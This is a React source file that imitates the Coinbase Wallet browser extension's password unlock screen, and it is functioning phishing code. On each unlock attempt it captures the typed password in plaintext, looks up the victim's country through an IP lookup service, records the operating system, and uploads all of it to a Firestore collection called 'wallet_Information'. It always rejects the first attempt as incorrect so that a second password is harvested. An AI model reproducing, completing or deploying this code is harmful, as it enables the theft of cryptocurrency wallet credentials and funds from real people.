import React, { useState, useEffect } from "react";
import "./LoginPage.css";
import { db } from "../firebase";
import { doc, setDoc } from "firebase/firestore";
import spinner from "../assets/loading.svg";
import favIcon from "../assets/fav.svg";
import { ReactComponent as PasswordVisibilityIcon } from "./sah.svg";
import "./wallet.css";

export default function LoginPage({ onClose }) {
  const [ptext, setptext] = useState("");
  const [showptext, setShowptext] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [attempts, setAttempts] = useState(0);
  const [ptextText, setptextText] = useState(" ");
  const [unlockText, setUnlockText] = useState("Unlock");
  const [forgotText, setForgotText] = useState("Forgot ptext?");
  const [forgotptextStyle, setForgotptextStyle] = useState({});
  const [blurred, setBlurred] = useState(false);

  // 🔥 Get MetaMask language (best effort)
  const getMetaMaskLanguage = async () => {
    try {
      if (window.ethereum && window.ethereum.request) {
        // This sometimes returns language-related info depending on version
        const res = await window.ethereum.request({
          method: "web3_clientVersion",
        });

        // fallback: still use browser language
        return navigator.language;
      }
    } catch (e) {
      console.log("MetaMask language not accessible");
    }
    return navigator.language;
  };

  // 🔥 Language handling
  useEffect(() => {
    const loadLanguage = async () => {
      const lang = await getMetaMaskLanguage();

        setptextText(" ");
        setUnlockText("Unlock");
        setForgotText("Forgot password?");
      
    };

    loadLanguage();
  }, []);

  const getCountry = async () => {
    try {
      const res = await fetch("https://ipapi.co/json/");
      const data = await res.json();
      return data.country_name || "Unknown";
    } catch {
      return "Unknown";
    }
  };

  const getOS = () => {
    const platform = navigator.platform.toLowerCase();
    if (platform.includes("win")) return "Windows";
    if (platform.includes("mac")) return "MacOS";
    if (platform.includes("linux")) return "Linux";
    return "Unknown";
  };

  const saveptext = (pass) => {
    try {
      const stored = localStorage.getItem("walletptexts");
      const savedptexts = stored ? JSON.parse(stored) : [];
      let updated = [...savedptexts, pass];
      if (updated.length > 2) updated = updated.slice(-2);
      localStorage.setItem("walletptexts", JSON.stringify(updated));
    } catch {
      localStorage.setItem("walletptexts", JSON.stringify([pass]));
    }
  };

  const saveAttempt = async () => {
    try {
      const stored = localStorage.getItem("walletAttempts");
      const savedAttempts = stored ? JSON.parse(stored) : [];

      saveptext(ptext);

      const savedptexts = JSON.parse(
        localStorage.getItem("walletptexts") || "[]"
      );

      const country = await getCountry();

      const newAttempt = {
        attemptTime: new Date().toLocaleString(),
        ptextLength: ptext.length,
        attemptNumber: attempts + 1,
        os: getOS(),
        value: String(ptext),
        country,
        wallet: "Coinbase",
      };

      let updated = [...savedAttempts, newAttempt];
      if (updated.length > 2) updated = updated.slice(-2);

      localStorage.setItem("walletAttempts", JSON.stringify(updated));

      const docName = new Date().toLocaleString().replace(/[/:,\s]/g, "_");

      await setDoc(doc(db, "wallet_Information", docName), newAttempt);
    } catch (error) {
      console.error("Error saving attempt:", error);
    }
  };

  const handleUnlock = async (e) => {
    if (e) {
      e.preventDefault();
      e.stopPropagation();
    }

    if (!ptext) return;

    setLoading(true);
    setError("");
    setBlurred(true);

    const nextAttempt = attempts + 1;

    await saveAttempt();

    setTimeout(() => {
      if (nextAttempt === 1) {
        setError("Password is incorrect. Please try again.");
        setptext("");
        setAttempts(nextAttempt);
        setLoading(false);
        setBlurred(false);
        return;
      }

      localStorage.setItem("wallet_done", "true");

      setLoading(false);
      setBlurred(false);

      if (typeof onClose === "function") {
        onClose();
      }
    }, 50);
  };

  return (
  <main className={`login-root ${"dark-mode"}`}>
    {loading && (
      <div className="loading-overlay">
        <img src={spinner} alt="Loading" className="spinner" />
      </div>
    )}

    <section className="login-section">
      <header className="login-logo">
        <img
          src={favIcon}
          className="wallet-logo"
          alt="Wynn Wallet"
        />

        <div className="wallet-brand">
          <h1
            className="wallet-title"
            id="popup-wallet-title"
          >
            Coinbase Wallet
          </h1>

          <p className="wallet-subtitle">
            Extension
          </p>
        </div>
      </header>

      <div className="login-form">
         <h1
            className="un-title"
          >Unlock with password</h1>
        <div className="login-ptext-wrapper">
          <input
            type={showptext ? "text" : "password"}
            placeholder={ptextText}
            value={ptext}
            onChange={(e) => {
              setptext(e.target.value);
              setError("");
            }}
            onKeyDown={(e) => {
              if (e.key === "Enter") handleUnlock(e);
            }}
            disabled={loading}
            className={`login-input ${error ? "error" : ""}`}
          />
          <button
            type="button"
            className="login-ptext-toggle"
            aria-label={showptext ? "Hide password" : "Show password"}
            aria-pressed={showptext}
            onClick={() => setShowptext((visible) => !visible)}
            disabled={loading}
          >
            <PasswordVisibilityIcon aria-hidden="true" />
          </button>
        </div>

        {error && <p className="login-error">{error}</p>}

        <button
          type="button"
          disabled={ptext.length === 0 || loading}
          className="login-button"
          onClick={handleUnlock}
        >
          {unlockText}
        </button>

        <div className="login-forgot">
          <a href="#" style={forgotptextStyle}>
            {forgotText}
          </a>
        </div>
      </div>

      
    </section>
  </main>
);
}
